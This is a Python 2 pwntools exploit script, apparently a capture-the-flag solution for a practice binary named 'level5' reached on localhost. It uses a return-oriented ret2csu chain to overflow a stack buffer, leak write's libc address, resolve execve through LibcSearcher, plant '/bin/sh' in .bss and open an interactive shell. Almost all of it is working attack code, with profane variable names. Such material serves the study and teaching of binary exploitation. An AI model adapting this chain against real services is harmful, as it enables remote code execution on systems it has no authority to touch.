#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./level5 --host localhost --port 9999
from pwn import *
from LibcSearcher import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./level5')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 9999)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


csu_init = 0x400606
csu_alc = 0x4005f0


# use libc_csu_init and return fuck
def csu(reg_values, padding_over, padding_over1, final_address):
    fuck = padding_over + [csu_init] + [1] + reg_values + [csu_alc] +  padding_over1 + [final_address]

    fuck = flat(fuck)

    # print 'padding_over ', flat(padding_over), ' ', len(flat(padding_over))
    # print '[csu_init] ', flat([csu_init]), ' ', len(flat([csu_init]))
    # print "['0'] ", flat([0]), ' ', len(flat([0]))
    # print "reg_values ", flat(reg_values), ' ', len(flat(reg_values))
    # print "[csu_alc] ", flat([csu_alc]), ' ', len(flat([csu_alc]))
    # print "padding_over1 ", flat(padding_over1), ' ', len(flat(padding_over1))
    # print "[final_address] ", flat([final_address]), ' ', len(flat([final_address]))

    return fuck
    
write_address = exe.got['write']
main_address = exe.symbols['main']
reg_values = [0, 1, write_address, 1, write_address, 8]
padding_over1 = ['A'] * 56
padding_over = ['B'] * 136

fuck = csu(reg_values, padding_over, padding_over1, main_address)
io = start()
io.recvuntil('Hello, World\n')

io.sendline(fuck)
sleep(1)

write_address = u64(io.recv(8))
libc = LibcSearcher('write', write_address)

libc_base = write_address - libc.dump('write')
# get real system address
# system_addr = libc_base + libc.dump('system')
system_addr = libc_base + libc.dump('execve')

read_addr =  exe.got['read']
bss_base = exe.bss()

# make /bin/bash string read(0, bss_base, 16)
reg_values = [0, 1, read_addr, 0, bss_base, 16]
padding_over = ['C'] * 136
padding_over1 = ['D'] * 56
fuck = csu(reg_values, padding_over, padding_over1, main_address)


print 'begin write address\n'

io.recvuntil('Hello, World\n')
io.sendline(fuck)
sleep(1)

print 'final ', p64(system_addr) + "/bin/sh\x00"
io.send(p64(system_addr) + "/bin/sh\x00")
sleep(1)

# get shell
io.recvuntil('Hello, World\n')
reg_values = [0, 1, bss_base, bss_base+8, 0, 0]
padding_over = ['E'] * 136
padding_over1 = ['F'] * 56
fuck = csu(reg_values, padding_over, padding_over1, main_address)
io.sendline(fuck)
sleep(1)


io.interactive()




#   4005f0:	4c 89 fa             	mov % r15, % rdx
#   4005f3:	4c 89 f6             	mov % r14, % rsi
#   4005f6:	44 89 ef             	mov % r13d, % edi
#   4005f9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)

#   400606:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
#   40060b:	48 8b 6c 24 10       	mov    0x10(%rsp),%rbp
#   400610:	4c 8b 64 24 18       	mov    0x18(%rsp),%r12
#   400615:	4c 8b 6c 24 20       	mov    0x20(%rsp),%r13
#   40061a:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
#   40061f:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
#   400624:	48 83 c4 38          	add    $0x38,%rsp
#   400628:	c3                   	retq 
